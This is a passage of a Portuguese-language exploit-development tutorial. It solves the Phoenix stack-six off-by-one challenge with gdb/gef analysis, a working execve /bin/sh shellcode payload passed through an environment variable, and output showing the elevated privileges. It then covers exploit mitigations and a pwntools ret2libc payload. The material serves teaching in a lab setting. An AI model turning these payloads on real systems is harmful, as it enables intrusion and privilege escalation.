<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack s√£o: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execu√ß√£o <code>c</code>, e ver se eles se alteram (lembrando greet √© vulner√°vel)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que n√≥s conseguimos controlar o √∫ltimos byte do rbp salvo! Esse ultimo byte constuma ser
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow √© um <code>BoF</code> que corrompe o <code>LSB</code>, ou como √© mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow √© bem comum: v√£o esquecer de que o buffer termina com um <code>0x00</code> e v√£o comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<a class="header" href="print.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as vari√°veis em uma posi√ß√£o,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> n√£o vai ser exploitavel, pois o byte que vem logo depois do buffer n√£o necessariamente √© o rbp!
E esse √© o nosso caso: existem outras vari√°veis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espa√ßo!</p>
<p>Caso a mensagem fosse 1 byte maior, poder√≠amos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, n√£o conseguir√≠amos controlar o rbp!</p>
<p>E caso a mensagem fosse 4 bytes a mais, como voc√™ pode imaginar, poder√≠amos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! √â o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que v√° nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execu√ß√£o de c√≥digo</strong></p>
<p>Na vida real, caso n√£o existisse essa mensagem, s√≥ conseguir√≠amos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
isto √©: n√£o existe nenhuma outra vari√°vel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, n√≥s nao conseguir√≠amos alterar RBP nem RIP,
portanto seria imposs√≠vel conseguir execu√ß√£o de c√≥digo :(

O m√°ximo que conseguimos fazer √© corromper 1 byte de uma vari√°vel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras vari√°veis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: n√£o acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela vari√°vel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<a class="header" href="print.html#como-ir-de-off-by-one-para-execu√ß√£o-de-c√≥digo" id="como-ir-de-off-by-one-para-execu√ß√£o-de-c√≥digo"><h2>Como ir de off-by-one para execu√ß√£o de c√≥digo</h2></a>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Ent√£o esse rbp que estamos alterando √© o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execu√ß√£o normalmente, na sua ultima instru√ß√£o (<code>ret</code>) a magica acontece</p>
<a class="header" href="print.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
<p>resumindo, ret √© um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, ent√£o +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para c√≥digo que controlamos, e apontar rbp para esse endere√ßo <strong>-</strong> 8 :D</p>
<p>Ent√£o caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execu√ß√£o :D</p>
<a class="header" href="print.html#-exploit-3" id="-exploit-3"><h1>üî• Exploit</h1></a>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que regi√£o podemos apontar rbp</li>
<li>Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</li>
</ol>
<a class="header" href="print.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input √© passado pelas env vars... portanto podemos falar que a unica regi√£o da memoria que
controlamos s√£o as env vars</p>
<p>E qual √© essa regi√£o? Vamos encontrar :D</p>
<a class="header" href="print.html#setup" id="setup"><h3>Setup</h3></a>
<p>As envs s√£o diferentes dentro do gdb, n√≥s podemos comparar usando</p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferen√ßa √©: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferen√ßa, e garantir que todos endere√ßos est√£o certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se voc√™ sair do gdb elas v√£o resetar!
</code></pre>
<a class="header" href="print.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endere√ßo e printando!</p>
<p><img src="./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente √© o inicio das envs, no nosso caso √© :D</p>
</blockquote>
<p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<a class="header" href="print.html#encontrar-para-que-regi√£o-podemos-apontar-rbp" id="encontrar-para-que-regi√£o-podemos-apontar-rbp"><h3>Encontrar para que regi√£o podemos apontar rbp</h3></a>
<p>Nesse caso √© f√°cil ne? Se n√≥s s√≥ podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<a class="header" href="print.html#encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</h3></a>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a regi√£o da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela regi√£o da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword s√£o 8 bytes, assim, 32 qwords s√£o 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa regi√£o</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endere√ßos, precisamos encontrar um que tenha um <strong>pointer que aponte para a regi√£o da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endere√ßos da regi√£o que controlamos come√ßam com <code>0x7fffffff</code>, ent√£o esse ja √© um bom come√ßo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500‚îÇ+0x0000 0x0000000000000001
0x00007fffffffe508‚îÇ+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510‚îÇ+0x0010 0x00007ffff7ffc948
0x00007fffffffe518‚îÇ+0x0018 0x00000000000000a6
0x00007fffffffe520‚îÇ+0x0020 0x00007fffffffe57f
0x00007fffffffe528‚îÇ+0x0028 0x0000000000000001
0x00007fffffffe530‚îÇ+0x0030 0x4141414141414141
0x00007fffffffe538‚îÇ+0x0038 0x00007ffff7ffb300
0x00007fffffffe540‚îÇ+0x0040 0x0000000000000000
0x00007fffffffe548‚îÇ+0x0048 0x0000000000600c00
0x00007fffffffe550‚îÇ+0x0050 0x000000000040079b
0x00007fffffffe558‚îÇ+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda n√£o o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e n√£o no endere√ßo</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos s√≥ levando os valores em considera√ß√£o! Para facilitar, tamb√©m podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O √∫nico valor valido √© <strong>0x00007fffffffef10</strong>, pois todos os outros s√£o menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endere√ßo desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8‚îÇ+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos n√£o queremos esse endere√ßo no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma fun√ß√£o retorna, o endere√ßo 8 bytes maior que rbp, √© onde o rip esta! Ent√£o por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
estamos definindo <code>rip = 0x00007fffffffe5c8</code> ent√£o nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E voc√™ talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Ent√£o n√£o precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se voc√™ quer continuar sozinhx, agora √© sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow √©: c0
Eu recomendo vc tentar encontrar ele por conta pr√≥pria pois
pode variar de acordo com o seu computador (explica√ß√£o em breve) :D
.
.
.
.
.
.
.
</code></pre>
<a class="header" href="print.html#shellcode-1" id="shellcode-1"><h2>Shellcode</h2></a>
<p>Ent√£o o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
<p>Isso quer dizer que conseguimos execu√ß√£o de c√≥digo! lembrando que isso √© muito fr√°gil: uma altera√ß√£o nas envs e o exploit quebra!</p>
<p>Nos podemos usar t√©cnicas como encontrar um pointer que esta numa localiza√ß√£o fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em s√≥ fazer ele funcionar! Caso vc queira, pode aplicar as t√©cnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao inv√©s de <code>/opt/phoenix/amd64/stack-six</code>, o exploit n√£o funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferen√ßa √© causada pela env <code>LS_COLORS</code>
(uma vari√°vel <strong>gigantesca</strong> que lista as cores do terminal!</p>
<p>Caso voc√™ utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferen√ßa!</p>
<p>Mas voc√™ esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! At√© achar um que funciona √© tentativa e erro! Eu recomendo voc√™ procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, voc√™ pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu √© o limite! Ou talvez nem o ceu... ja que esse esse √© um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial √© sobre quebrar o limite de buffers! N√£o tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de voc√™ socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem gra√ßa a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Ent√£o parab√©ns por ter chegado ate aqui! :D</p>
<a class="header" href="print.html#-solu√ß√£o-6" id="-solu√ß√£o-6"><h1>üí´ Solu√ß√£o</h1></a>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<a class="header" href="print.html#dep--nx--wx" id="dep--nx--wx"><h1>DEP | NX | W^X</h1></a>
<p>Todas essas pretendem impedir a execu√ß√£o de c√≥digo em
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o c√≥digo escrito
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou
execut√°vel, mas nunca as duas simultaneamente:
<strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Voc√™ vai ouvir pessoas usando os 3 nomes para representar
esse conceito, e dependendo do contexto n√£o tem problema!</p>
<p>Porem eles s√£o tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados):
a implementa√ß√£o do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para
garantir a exclus√£o mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu n√£o lembro...
e n√£o importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclus√£o mutua de escrever e executar
ocorre por meio de paging: o sistema operacional decide
as permiss√µes das paginas de memorias, e garante que uma
n√£o viole W^X . <strong>No momento que voc√™ esta lendo, isso
pode ter mudado!</strong></p>
</blockquote>
<a class="header" href="print.html#system-aslr" id="system-aslr"><h1>System ASLR</h1></a>
<p>ASLR randomiza os endere√ßos das coisas na memoria! Porem
com as suas limita√ß√µes, dado que depende doo sistema
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do execut√°vel (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endere√ßo do c√≥digo n√£o muda!</strong></p>
<a class="header" href="print.html#pie" id="pie"><h1>PIE</h1></a>
<p>Para garantir que o c√≥digo tamb√©m tenha sua posi√ß√£o
randomizada, o bin√°rio precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osi√ß√£o) impede
que o codigo possa ser executado independente da sua<br />
posi√ß√£o na memoria (duh :P)</p>
<p>Para garantir isso, todos endere√ßos precisam ser relativos ao inv√©s de absolutos!</p>
<pre><code>            Endere√ßo	Instru√ß√£o
Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
            0x0002	add 1 2
            0x0003	add 1 3

Com PIE     ------	jmp EIP+2  &lt;- EIP
            ------	add 1 2
            ------	add 1 3
</code></pre>
<p>No primeiro caso, se o execut√°vel mudar de endere√ßo
o <code>JMP</code> pularia para a instru√ß√£o errada, por causa do
endere√ßo absoluto.</p>
<hr />
<p>TODO</p>
<hr />
<a class="header" href="print.html#relro" id="relro"><h1>RELRO</h1></a>
<a class="header" href="print.html#canaries" id="canaries"><h1>Canaries</h1></a>
<a class="header" href="print.html#outras" id="outras"><h1>Outras</h1></a>
<a class="header" href="print.html#linux" id="linux"><h2>Linux</h2></a>
<a class="header" href="print.html#pointer-guard" id="pointer-guard"><h3>Pointer Guard</h3></a>
<a class="header" href="print.html#windows" id="windows"><h2>Windows</h2></a>
<a class="header" href="print.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
<p>Ret2Libc foi uma t√©cnica desenvolvida para combater W^X. Alem disso,
ter dom√≠nio dessa t√©cnica facilitar a compreens√£o de ROP. :D</p>
<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
encontrar uma parte execut√°vel na memoria! Uma fun√ß√£o do pr√≥prio programa!</p>
<p>Voce se lembra de quando cham√°vamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
iniciais? Ent√£o... poder√≠amos fazer isso... mas ningu√©m colocaria uma
fun√ß√£o pre-pronta pra nos dar uma shell :(</p>
<p>Felizmente, existe LibC, e dentro dela existem m√∫ltiplas fun√ß√µes √∫teis!</p>
<a class="header" href="print.html#fun√ß√µes-√öteis" id="fun√ß√µes-√öteis"><h1>Fun√ß√µes √öteis</h1></a>
<a class="header" href="print.html#system" id="system"><h2>System()</h2></a>
<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
<p>Para nosso prop√≥sito, ela recebe 1 argumento, o caminho do programa para
executar (Ex: <code>/bin/sh</code>)</p>
<p>Em C:</p>
<pre><code class="language-C">#include &lt;stdlib.h&gt;
int main() {
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>Em assembly:</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;/bin/ls&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
</code></pre>
<p>A fun√ß√£o recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
bits!</p>
<a class="header" href="print.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
<p>Usando pwntools:</p>
<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
</code></pre>
<p>x sera um pointer contendo o endere√ßo da string <code>/bin/sh</code></p>
<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
<a class="header" href="print.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
<pre><code class="language-x86asm">    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
|____________|   Ent√£o da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulner√°vel a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    Ent√£o podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  fun√ß√£o que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

</code></pre>
<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
(<code>fork</code>, gerando um processo secund√°rio: <code>child_proc</code>)!</p>
<p>Ent√£o retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
reportado para o processo principal e nao para o computador!</p>
<blockquote>
<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
</blockquote>
<a class="header" href="print.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
<p>Vamos supor que o programa esta vulner√°vel a um BoF tradicional na fun√ß√£o
<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
</code></pre>
<p>Caso voce esteja com pressa, adios!</p>
<p>Daqui em diante eu vou discutir t√©cnicas alternativas de ret2libc, vantagens
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
ROP!</p>
<a class="header" href="print.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
funciona igual <code>System</code>, porem com uma diferen√ßa: <code>System</code> cria um novo
processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
simplesmente chamar ele, quando voce fechar a shell vai gerar uma
